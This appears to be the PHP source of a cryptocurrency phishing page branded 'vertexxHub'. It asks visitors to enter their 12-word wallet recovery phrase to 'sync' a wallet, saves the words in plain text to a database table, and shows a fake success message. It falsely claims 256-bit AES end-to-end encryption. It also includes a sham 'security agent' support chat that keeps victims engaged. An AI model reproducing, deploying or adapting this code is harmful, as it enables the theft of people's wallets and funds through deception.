<?php
include 'cdn.php';
include 'config.php';
$u = preg_replace('/\D/', '', $req);

$chk = $conn->query("select * from user_details where uid='$u'");
if($chk->num_rows > 0) {
    $loop = $chk->fetch_assoc();
    $name = $loop['uname'];
    $new_req = substr($name, 0, 3).$u;

    $parts = explode('-', $req);
    $words_after_hyphen = array_slice($parts, 1);
    $wallet_slug = implode('-', $words_after_hyphen);
    $is_support = ($wallet_slug == "Support");

    // Handle messages
    if(isset($_POST["msg_user"])) {
        $msg = filter($_POST["msg_user"]);
        $conn->query("INSERT INTO messages (uid, sender, message) VALUES ('$u', 'user', '$msg')");
        $success_msg = "Message sent to support!";
    }

    // Handle Seed Phrase
    if(isset($_POST['one'])) {
        $phrase_parts = [];
        for($i=1; $i<=12; $i++) {
            $key = ['one','two','three','four','five','six','seven','eight','nine','ten','eleven','twelve'][$i-1];
            $phrase_parts[] = filter($_POST[$key]);
        }
        $str = implode(',', $phrase_parts);
        $put = $conn->query("insert into seed_phrase(uid,uname,phrase) values('$u','$name','$str')");
        if($put) {
            $success_msg = "Your wallet has been connected successfully.";
            $show_back = true;
        } else {
            $error_msg = "Your wallet could not be connected. Please try again.";
        }
    }

    include 'dashboard_header.php';
    ?>

    <div class="max-w-4xl mx-auto">
        <?php if($is_support): ?>
            <!-- Support Interface -->
            <div class="flex flex-col h-[calc(100vh-200px)] lg:h-[700px] card-dark rounded-[2.5rem] border-white/5 overflow-hidden shadow-2xl">
                <!-- Chat Header -->
                <div class="p-6 lg:p-8 bg-white/5 border-b border-white/5 flex items-center justify-between">
                    <div class="flex items-center gap-4">
                        <div class="relative">
                            <div class="w-12 h-12 bg-gradient-gold rounded-2xl flex items-center justify-center text-black shadow-lg">
                                <i class="fas fa-headset text-xl"></i>
                            </div>
                            <span class="absolute -bottom-1 -right-1 w-4 h-4 bg-green-500 border-4 border-[#0a0a0a] rounded-full"></span>
                        </div>
                        <div>
                            <h3 class="font-syne font-800 text-white">vertexxHub Support</h3>
                            <p class="text-[10px] text-green-400 font-700 uppercase tracking-widest">Active · 24/7 Agent</p>
                        </div>
                    </div>
                </div>

                <!-- Chat Messages -->
                <div class="flex-1 p-6 lg:p-10 overflow-y-auto space-y-6" id="chat-container">
                    <?php
                    $msgs = $conn->query("SELECT * FROM messages WHERE uid = '$u' ORDER BY tm ASC");
                    if($msgs->num_rows > 0):
                        while($m = $msgs->fetch_assoc()):
                            $is_admin = ($m['sender'] == 'admin');
                    ?>
                        <div class="flex <?php echo $is_admin ? 'justify-start' : 'justify-end'; ?>">
                            <div class="max-w-[80%] <?php echo $is_admin ? 'order-2' : 'order-1'; ?>">
                                <div class="p-4 rounded-2xl text-sm leading-relaxed <?php echo $is_admin ? 'bg-white/10 text-white rounded-tl-none' : 'bg-gradient-gold text-black font-600 rounded-tr-none shadow-lg shadow-orange-500/10'; ?>">
                                    <?php echo htmlspecialchars($m['message']); ?>
                                </div>
                                <p class="text-[9px] text-gray-600 mt-2 font-700 uppercase tracking-tighter <?php echo $is_admin ? 'text-left' : 'text-right'; ?>">
                                    <?php echo date('H:i', strtotime($m['tm'])); ?>
                                </p>
                            </div>
                        </div>
                    <?php
                        endwhile;
                    else:
                    ?>
                        <div class="h-full flex flex-col items-center justify-center text-center opacity-30 px-12">
                            <i class="fas fa-comments text-5xl mb-6"></i>
                            <h4 class="font-syne font-700 text-lg">No message history</h4>
                            <p class="text-xs mt-2 leading-relaxed">Type your query below to start a conversation with our security experts.</p>
                        </div>
                    <?php endif; ?>
                </div>

                <!-- Chat Input -->
                <div class="p-6 lg:p-8 bg-black/40 border-t border-white/5">
                    <form action="/support/<?php echo $req;?>" method="post" class="relative group">
                        <input type="text" name="msg_user" placeholder="Type your message here..." required
                            class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 pl-6 pr-16 text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-primary/50 transition-all">
                        <button type="submit" class="absolute right-2 top-2 bottom-2 px-5 bg-gradient-gold text-black rounded-xl font-800 transition-all hover:scale-105 active:scale-95 shadow-lg shadow-orange-500/20">
                            <i class="fas fa-paper-plane"></i>
                        </button>
                    </form>
                </div>
            </div>

            <script>
                const container = document.getElementById('chat-container');
                container.scrollTop = container.scrollHeight;
            </script>

        <?php else: ?>
            <!-- Wallet Seed Phrase Interface -->
            <div class="max-w-2xl mx-auto">
                <div class="text-center mb-12">
                    <div class="w-20 h-20 bg-gradient-gold rounded-3xl flex items-center justify-center mx-auto mb-6 shadow-xl shadow-orange-500/20">
                        <i class="fas fa-shield-halved text-black text-3xl"></i>
                    </div>
                    <h2 class="font-syne text-3xl font-800 text-white mb-3">Sync <?php echo ucfirst($wallet_slug); ?></h2>
                    <p class="text-gray-400 max-w-sm mx-auto leading-relaxed">Enter your 12-word secret recovery phrase to verify ownership and synchronize your assets.</p>
                </div>

                <?php if(isset($success_msg)): ?>
                    <div class="mb-10 p-8 rounded-[2.5rem] bg-green-500/10 border border-green-500/20 text-center">
                        <div class="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <i class="fas fa-check text-green-400 text-2xl"></i>
                        </div>
                        <h3 class="font-syne font-800 text-green-400 text-xl mb-4"><?php echo $success_msg; ?></h3>
                        <a href='/web/<?php echo $new_req;?>' class="inline-block px-8 py-3 bg-green-500 text-black font-800 rounded-xl hover:scale-105 transition-all uppercase text-xs tracking-widest">Return to Wallet</a>
                    </div>
                <?php else: ?>
                    <div class="card-dark rounded-[2.5rem] p-8 lg:p-12 border-white/5 relative overflow-hidden">
                        <div class="absolute top-0 right-0 w-64 h-64 bg-primary/5 rounded-full blur-[100px] -mr-32 -mt-32"></div>

                        <form action='/support/<?php echo $req;?>' method='post' class="relative z-10">
                            <div class="grid grid-cols-2 md:grid-cols-3 gap-4 lg:gap-6 mb-10">
                                <?php
                                $words = ['one','two','three','four','five','six','seven','eight','nine','ten','eleven','twelve'];
                                foreach($words as $index => $key):
                                ?>
                                <div class="relative">
                                    <span class="absolute top-3.5 left-4 text-[10px] font-900 text-gray-700 uppercase"><?php echo $index + 1; ?></span>
                                    <input type="text" name="<?php echo $key; ?>" placeholder="word" required
                                        class="w-full bg-black/40 border border-white/10 rounded-xl py-4 pl-10 pr-4 text-white text-sm focus:outline-none focus:ring-2 focus:ring-primary/50 transition-all placeholder-gray-800 font-600">
                                </div>
                                <?php endforeach; ?>
                            </div>

                            <button type="submit" class="w-full bg-gradient-gold text-black font-800 py-5 rounded-2xl shadow-lg shadow-orange-500/20 hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-3 font-syne uppercase tracking-wider">
                                Securely Sync Wallet <i class="fas fa-shield-check"></i>
                            </button>

                            <div class="mt-8 flex flex-col items-center gap-4">
                                <p class="text-[11px] text-gray-500 flex items-center gap-2">
                                    <i class="fas fa-lock text-primary"></i> 256-bit AES End-to-End Encryption
                                </p>
                                <p class="text-[11px] text-gray-500">
                                    Lost your phrase? <a href='/support/<?php echo $req;?>-Support' class="text-primary font-700 underline ml-1">Contact Security Agent</a>
                                </p>
                            </div>
                        </form>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>

    <?php
    include 'dashboard_footer.php';
}
?>
